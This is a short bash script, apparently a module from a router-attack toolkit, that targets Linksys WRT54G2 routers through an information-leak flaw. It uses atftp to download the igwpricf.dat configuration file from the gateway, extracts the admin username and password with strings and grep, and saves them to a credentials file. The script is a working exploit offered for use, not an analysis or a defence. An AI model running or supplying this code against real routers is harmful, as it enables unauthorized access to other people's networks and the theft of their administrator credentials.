#!/bin/bash

# Linksys Module

# Supported Models
# WRT54G2
# WRT54G2-WFA
# v8.00.2
# 1.0.01
# 1.0.02
# 1.0.03
# 1.0.04

nmap_output="/tmp/menu/router.tmp"
gateway=$1
interface=$2
user=""

mkdir /tmp/menu

function display() {                                                                          # Make It Pretty
      output=""
      if [ "$1" == "action" ]; then output="\e[01;32m[>]\e[00m"
      elif [ "$1" == "info" ]; then output="\e[01;33m[i]\e[00m"
      elif [ "$1" == "diag" ]; then output="\e[01;34m[+]\e[00m"
      elif [ "$1" == "error" ]; then output="\e[01;31m[!]\e[00m"; fi
      output="$output $2"
      echo -e "$output"

      if [ "$diagnostics" == "true" ]; then
         if [ "$1" == "action" ]; then output="[>]"
         elif [ "$1" == "info" ]; then output="[i]"
         elif [ "$1" == "diag" ]; then output="[+]"
         elif [ "$1" == "error" ]; then output="[!]"
         fi
      fi
}

echo "Attempting WRT54GV2 Information Leak Vulnerability"
atftp --get -r igwpricf.dat -l /tmp/menu/igwpricf.dat $gateway
#    Alternate File DL        "igwhtm.dat"
strings /tmp/menu/igwpricf.dat | grep admin -A 4 > /tmp/menu/router_pass1 

user=$(sed -n '1p' < /tmp/menu/router_pass1)
pass=$(sed -n '2p' < /tmp/menu/router_pass1)

echo "$gateway 69/tftp/s: '$user' '$pass'" >> /tmp/menu/creds

#   size          date       time       name
# --------       ------     ------    --------
#   956756    Jan-01-2003  02:13:12   ap61.sys          
#   224664    Jan-01-2003  02:13:24   igwhtm.dat        
#    28528    Jan-01-2003  02:13:26   langpak_en        
#    28482    Apr-08-2011  15:36:44   igwpricf.dat      
#     2520    Apr-08-2011  15:11:02   nvram.cfg         
#     2046    Dec-24-2001  00:02:42   calibra.dat
